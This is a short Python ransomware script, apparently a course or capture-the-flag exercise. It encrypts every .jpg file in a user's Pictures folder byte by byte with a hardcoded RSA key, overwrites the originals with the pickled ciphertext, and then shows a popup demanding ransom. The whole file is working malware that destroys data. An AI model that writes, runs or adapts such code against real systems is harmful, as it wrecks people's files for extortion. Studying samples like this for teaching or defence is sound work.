#!/usr/bin/env python3

import os
import sys
import pickle
import subprocess

n = int(22291846172619859445381409012451)
e = int(65535)

directory = r'/home/csc2021/Pictures'
#directory = r'/home/user/Documents'
if sys.argv[1] == '0':
  for filename in os.listdir(directory):
    if filename.endswith(".jpg"):
      filepath = os.path.join(directory, filename)
      plain_bytes = b''
      with open(filepath, 'rb') as file:
        plain_bytes = file.read()
      cipher = [pow(i, e, n) for i in plain_bytes]
      with open(filepath, 'wb') as file:
          pickle.dump(cipher, file)

subprocess.call("zenity --error --text=\"Give me ransom haha\" --title=\"Error\"", shell = True)
